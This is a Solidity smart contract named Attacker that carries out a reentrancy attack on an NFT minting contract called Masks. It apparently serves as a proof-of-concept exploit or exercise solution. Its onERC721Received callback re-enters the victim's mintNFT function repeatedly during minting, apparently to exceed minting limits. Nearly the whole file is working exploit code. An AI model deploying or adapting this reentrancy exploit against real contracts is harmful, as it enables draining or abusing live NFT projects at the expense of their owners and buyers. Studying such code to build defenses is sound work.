// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./vault.sol";
// @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
contract Attacker is IERC721Receiver {

    Masks victim;

    struct NFT {
        address tokenAddress;
        uint256 tokenId;
    }
    NFT[] public receivedNFTs;

    constructor(address _victim) payable {
        victim = Masks(_victim);
    }


    uint256 upper = 25;
    uint256 point_one_ether = 0.1 ether;

    function attack() external payable{
        uint256 count = 20;
        upper--;

        victim.mintNFT{value: point_one_ether * count }(count);
    }

    function nftCount()external view returns(uint256){
        return receivedNFTs.length;
    }


    function onERC721Received(address operator, address , uint256 tokenId, bytes calldata) external returns (bytes4){
        require(operator == address(this), "NFTCollector: Must be sent by the NFTCollector contract itself");
        receivedNFTs.push(NFT(msg.sender, tokenId));

        if(upper > 0){
            uint256 count = 6;
            upper--;

            victim.mintNFT{value: point_one_ether * count}(count);
        }

        return this.onERC721Received.selector;
    }

}